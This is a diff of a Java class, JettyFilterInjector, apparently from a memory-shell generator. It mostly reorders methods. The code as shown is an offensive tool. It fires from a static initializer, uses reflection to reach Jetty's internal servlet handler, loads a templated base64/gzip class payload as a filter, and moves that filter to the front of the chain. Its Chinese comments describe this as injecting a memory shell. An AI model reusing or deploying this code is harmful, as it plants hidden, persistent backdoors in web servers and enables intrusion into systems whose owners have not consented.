@@ -16,22 +16,10 @@ import java.util.zip.GZIPInputStream;
 
 public class JettyFilterInjector {
 
-    public String getUrlPattern() {
-        return "{{urlPattern}}";
-    }
-
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() throws IOException {
-        return "{{base64Str}}";
-    }
-
     static {
         new JettyFilterInjector();
     }
+
 
     public JettyFilterInjector() {
         try {
@@ -46,30 +34,132 @@ public class JettyFilterInjector {
 
     }
 
+    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+        } catch (Exception ignored) {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        }
+    }
+
+    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
+        GZIPInputStream ungzip = new GZIPInputStream(in);
+        byte[] buffer = new byte[256];
+        int n;
+        while ((n = ungzip.read(buffer)) >= 0) {
+            out.write(buffer, 0, n);
+        }
+        return out.toByteArray();
+    }
+
+    static Object getFV(Object obj, String fieldName) throws Exception {
+        Field field = getF(obj, fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+
+    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
+        Class<?> clazz = obj.getClass();
+        while (clazz != null) {
+            try {
+                Field field = clazz.getDeclaredField(fieldName);
+                field.setAccessible(true);
+                return field;
+            } catch (NoSuchFieldException e) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException(fieldName);
+    }
+
+    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
+        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
+    }
+
+    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
+        Method method = null;
+
+        Class tempClass = clazz;
+        while (method == null && tempClass != null) {
+            try {
+                if (paramClazz == null) {
+                    // Get all declared methods of the class
+                    Method[] methods = tempClass.getDeclaredMethods();
+                    for (int i = 0; i < methods.length; i++) {
+                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
+                            method = methods[i];
+                            break;
+                        }
+                    }
+                } else {
+                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
+                tempClass = tempClass.getSuperclass();
+            }
+        }
+        if (method == null) {
+            throw new NoSuchMethodException(methodName);
+        }
+        method.setAccessible(true);
+        if (obj instanceof Class) {
+            try {
+                return method.invoke(null, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        } else {
+            try {
+                return method.invoke(obj, param);
+            } catch (IllegalAccessException e) {
+                throw new RuntimeException(e.getMessage());
+            }
+        }
+    }
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
     public void addFilter(Object context, Object magicFilter) throws Exception {
         Class<?> filterClass = magicFilter.getClass();
-            Object servletHandler = getFV(context, "_servletHandler");
+        Object servletHandler = getFV(context, "_servletHandler");
 
-            // 1. 判断是否已经注入
-            if (isInjected(servletHandler)) {
-                System.out.println("filter is already injected");
-                return;
-            }
+        // 1. 判断是否已经注入
+        if (isInjected(servletHandler)) {
+            System.out.println("filter is already injected");
+            return;
+        }
 
-            Class<?> filterHolderClass = null;
-            try {
-                filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
-            } catch (ClassNotFoundException e) {
-                filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
-            }
-            Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
-            Object filterHolder = constructor.newInstance(filterClass);
-            invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
+        Class<?> filterHolderClass = null;
+        try {
+            filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
+        } catch (ClassNotFoundException e) {
+            filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
+        }
+        Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
+        Object filterHolder = constructor.newInstance(filterClass);
+        invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});
 
-            // 2. 注入内存马Filter
-            invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});
+        // 2. 注入内存马Filter
+        invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});
 
-            // 3. 修改Filter的优先级为第一位
+        // 3. 修改Filter的优先级为第一位
         moveFilterToFirst(servletHandler);
 
         try {
@@ -221,96 +311,5 @@ public class JettyFilterInjector {
             return false;
         }
         return false;
-    }
-
-
-    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
-        Class<?> decoderClass;
-        try {
-            decoderClass = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
-        } catch (Exception ignored) {
-            decoderClass = Class.forName("java.util.Base64");
-            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
-            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
-        }
-    }
-
-    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
-        ByteArrayOutputStream out = new ByteArrayOutputStream();
-        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
-        GZIPInputStream ungzip = new GZIPInputStream(in);
-        byte[] buffer = new byte[256];
-        int n;
-        while ((n = ungzip.read(buffer)) >= 0) {
-            out.write(buffer, 0, n);
-        }
-        return out.toByteArray();
-    }
-
-    static Object getFV(Object obj, String fieldName) throws Exception {
-        Field field = getF(obj, fieldName);
-        field.setAccessible(true);
-        return field.get(obj);
-    }
-
-    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
-        Class<?> clazz = obj.getClass();
-        while (clazz != null) {
-            try {
-                Field field = clazz.getDeclaredField(fieldName);
-                field.setAccessible(true);
-                return field;
-            } catch (NoSuchFieldException e) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        throw new NoSuchFieldException(fieldName);
-    }
-
-    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
-        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
-    }
-
-    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
-        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
-        Method method = null;
-
-        Class tempClass = clazz;
-        while (method == null && tempClass != null) {
-            try {
-                if (paramClazz == null) {
-                    // Get all declared methods of the class
-                    Method[] methods = tempClass.getDeclaredMethods();
-                    for (int i = 0; i < methods.length; i++) {
-                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
-                            method = methods[i];
-                            break;
-                        }
-                    }
-                } else {
-                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
-                }
-            } catch (NoSuchMethodException e) {
-                tempClass = tempClass.getSuperclass();
-            }
-        }
-        if (method == null) {
-            throw new NoSuchMethodException(methodName);
-        }
-        method.setAccessible(true);
-        if (obj instanceof Class) {
-            try {
-                return method.invoke(null, param);
-            } catch (IllegalAccessException e) {
-                throw new RuntimeException(e.getMessage());
-            }
-        } else {
-            try {
-                return method.invoke(obj, param);
-            } catch (IllegalAccessException e) {
-                throw new RuntimeException(e.getMessage());
-            }
-        }
     }
 }
